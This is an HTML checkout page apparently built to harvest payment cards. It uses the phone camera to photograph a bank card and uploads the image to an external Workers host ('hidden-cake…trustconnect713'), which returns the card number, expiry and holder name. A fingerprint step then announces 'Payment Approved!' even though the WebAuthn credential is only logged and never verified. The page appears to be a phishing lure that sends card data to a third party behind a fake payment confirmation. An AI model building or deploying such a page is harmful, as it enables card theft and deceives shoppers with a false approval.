<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Biometric Card Checkout</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      background: #121212;
      color: #ffffff;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 16px;
    }
    .checkout-card {
      background: #1e1e1e;
      border: 1px solid #2d2d2d;
      border-radius: 12px;
      padding: 20px;
      width: 100%;
      max-width: 440px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
    }
    h2 { font-size: 1.2rem; text-align: center; margin-bottom: 16px; }
    .media-container {
      position: relative;
      width: 100%;
      aspect-ratio: 4 / 3;
      background: #000;
      border-radius: 8px;
      overflow: hidden;
      margin-bottom: 16px;
    }
    video { width: 100%; height: 100%; object-fit: cover; }
    button {
      width: 100%;
      padding: 14px;
      border: none;
      border-radius: 8px;
      font-weight: 600;
      font-size: 0.95rem;
      cursor: pointer;
      margin-bottom: 10px;
      transition: background 0.2s ease;
    }
    .btn-scan { background: #28a745; color: #fff; }
    .btn-pay { background: #007bff; color: #fff; }
    button:disabled { background: #333333; color: #777777; cursor: not-allowed; }
    .status-box {
      background: #262626;
      border: 1px solid #333;
      padding: 12px;
      border-radius: 6px;
      font-family: monospace;
      font-size: 0.85rem;
      white-space: pre-wrap;
      word-break: break-all;
      margin-bottom: 12px;
    }
  </style>
</head>
<body>

<div class="checkout-card">
  <h2>Zero-Friction Checkout</h2>

  <div class="media-container">
    <video id="video" autoplay playsinline muted></video>
  </div>

  <button id="scanBtn" class="btn-scan">1. Scan & Verify Card</button>
  
  <div id="statusBox" class="status-box">Status: Camera starting...</div>
  <div id="resultBox" class="status-box">Card Details: Pending scan</div>

  <button id="payBtn" class="btn-pay" disabled>2. Pay with Fingerprint</button>
</div>

<script>
  const WORKER_URL = "https://hidden-cake-9572.trustconnect713.workers.dev";
  
  const video = document.getElementById('video');
  const scanBtn = document.getElementById('scanBtn');
  const payBtn = document.getElementById('payBtn');
  const statusBox = document.getElementById('statusBox');
  const resultBox = document.getElementById('resultBox');

  // Start Rear Camera Stream
  navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } })
    .then(stream => {
      video.srcObject = stream;
      statusBox.innerText = "Status: Camera active";
    })
    .catch(err => {
      statusBox.innerText = "Camera access error: " + err.message;
    });

  // Capture frame from video & compress to JPEG base64
  function captureAndCompressFrame(maxWidth = 800, quality = 0.8) {
    return new Promise((resolve) => {
      const canvas = document.createElement('canvas');
      let width = video.videoWidth || 640;
      let height = video.videoHeight || 480;

      if (width > maxWidth) {
        height = Math.round((height * maxWidth) / width);
        width = maxWidth;
      }

      canvas.width = width;
      canvas.height = height;

      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, width, height);

      resolve(canvas.toDataURL('image/jpeg', quality));
    });
  }

  // 1. Scan and Analyze Card
  scanBtn.addEventListener('click', async () => {
    try {
      scanBtn.disabled = true;
      statusBox.innerText = "Status: Capturing & compressing frame...";

      const compressedBase64 = await captureAndCompressFrame();

      statusBox.innerText = "Status: Verifying with Workers AI...";
      const response = await fetch(`${WORKER_URL}/api/ai/verify`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ imageBase64: compressedBase64 })
      });

      if (!response.ok) throw new Error(`HTTP Error ${response.status}`);

      const data = await response.json();
      const result = typeof data.response === 'string' ? JSON.parse(data.response) : data.response;

      if (!result.isBankCard) {
        statusBox.innerText = "Status: Scan completed - Not a valid card";
        resultBox.innerText = "Error: Please align a valid bank card in view.";
        scanBtn.disabled = false;
        return;
      }

      statusBox.innerText = "Status: Valid bank card verified!";
      resultBox.innerText = `
--- CARD DETECTED ---
Type   : ${result.cardType || 'Unknown'}
Digits : ${result.primaryDigits || 'N/A'}
Expiry : ${result.expiryDate || 'N/A'}
Holder : ${result.cardholderName || 'N/A'}
      `.trim();

      // Enable WebAuthn button
      payBtn.disabled = false;
      scanBtn.disabled = false;

    } catch (err) {
      statusBox.innerText = "Status: OCR Error";
      resultBox.innerText = err.message;
      scanBtn.disabled = false;
    }
  });

  // 2. Trigger WebAuthn Biometric Verification
  payBtn.addEventListener('click', async () => {
    try {
      payBtn.disabled = true;
      statusBox.innerText = "Status: Fetching security challenge...";

      const challengeRes = await fetch(`${WORKER_URL}/api/auth/challenge`);
      if (!challengeRes.ok) throw new Error("Could not retrieve challenge.");

      const { challenge } = await challengeRes.json();
      const challengeBuffer = Uint8Array.from(
        atob(challenge.replace(/-/g, '+').replace(/_/g, '/')), 
        c => c.charCodeAt(0)
      );

      statusBox.innerText = "Status: Prompting device biometrics...";

      const credential = await navigator.credentials.get({
        publicKey: {
          challenge: challengeBuffer,
          timeout: 60000,
          userVerification: "required"
        }
      });

      statusBox.innerText = "Status: Payment Approved!";
      alert("Payment Cryptographically Signed via Biometrics!");
      console.log("WebAuthn Signature Payload:", credential);

    } catch (err) {
      statusBox.innerText = "Status: Biometric Auth Failed";
      alert("Biometric auth failed: " + err.message);
      payBtn.disabled = false;
    }
  });
</script>

</body>
</html>
